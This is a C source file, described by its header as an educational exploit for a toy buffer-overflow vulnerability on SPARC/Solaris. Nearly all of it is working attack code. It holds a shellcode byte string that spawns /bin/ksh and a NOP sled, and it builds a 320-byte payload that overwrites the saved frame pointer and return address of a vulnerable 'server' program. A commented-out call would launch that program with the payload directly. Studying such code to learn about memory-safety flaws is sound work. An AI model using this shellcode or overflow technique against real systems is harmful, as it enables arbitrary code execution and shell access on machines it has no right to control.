/* Exploits toy vulnerbility on Sparc/Solaris
 *  Edwin Sha for Educational prupose
 */

#include <stdlib.h>
#include <stdio.h>

/* lsd - Solaris shellcode 
 */
static char shell[]=         /* 10*4+8 bytes */

        "\x20\xbf\xff\xff"   /* bn,a  */
        "\x20\xbf\xff\xff"   /* bn,a  */
        "\x7f\xff\xff\xff"   /* call  */
        "\x90\x03\xe0\x20"   /* add %o7,32,%o0 */
        "\x92\x02\x20\x10"   /* add %o0,16,%o1 */
        "\xc0\x22\x20\x08"   /* st %g0,[%o0+8] */
        "\xd0\x22\x20\x10"   /* st %o0,[%o0+16] */
        "\xc0\x22\x20\x14"   /* st %g0,[%o0+20] */
        "\x82\x10\x20\x0b"   /* mov 0x0b,%g1 */
        "\x91\xd0\x20\x08"   /* ta 8 */
        "/bin/ksh" ;


#define BUFSIZE 320

/* SPARC NOP
 */
static char np[] = "\xac\x15\xa1\x6e";


unsigned long get_sp( void ) {
        asm("or %sp,%sp,%i0");
}


main( int argc, char *argv[] ) {

        char buf[ BUFSIZE+1 ],*ptr;
        unsigned long ret,sp;
        int rem,i,err;

        ret = sp = get_sp();

        if( argv[1] ) {
                ret -= strtoul( argv[1], (void *)0, 16 );
        }

        /* align return address: IMPORTANT to be multiple of 8!! */
   
        if( ( rem = ret % 8 ) ) {
                ret &= ~(rem);
        }
        
        bzero( buf, BUFSIZE );
        for( i = 0; i < BUFSIZE; i+=4 ) {
                strcpy( &buf[i], np );
        }

        memcpy( (buf + BUFSIZE - strlen( shell ) - 8),shell,strlen( shell ));

        ptr = &buf[312];
         
        /* set fp to a save stack value
         */
        *( ptr++ ) = ( sp >> 24 ) & 0xff;
        *( ptr++ ) = ( sp >> 16 ) & 0xff;
        *( ptr++ ) = ( sp >> 8 ) & 0xff;
        *( ptr++ ) = ( sp ) & 0xff;


        /* we now overwrite saved PC
         */
        *( ptr++ ) = ( ret >> 24 ) & 0xff;
        *( ptr++ ) = ( ret >> 16 ) & 0xff;
        *( ptr++ ) = ( ret >> 8 ) & 0xff;
        *( ptr++ ) = ( ret ) & 0xff;
		
        buf[ BUFSIZE ] = 0;


#ifndef QUIET
        //printf("Return Address 0x%x\n",ret);
        //printf("Start overflowing server program\n");
        //printf("Then a program such as shell can be executed after server program is over\n");
	printf("%s", buf);
#endif
        		
        //err = execl( "./server", "server", buf, ( void *)0 );
        //if( err == -1 ) perror("execl");
}

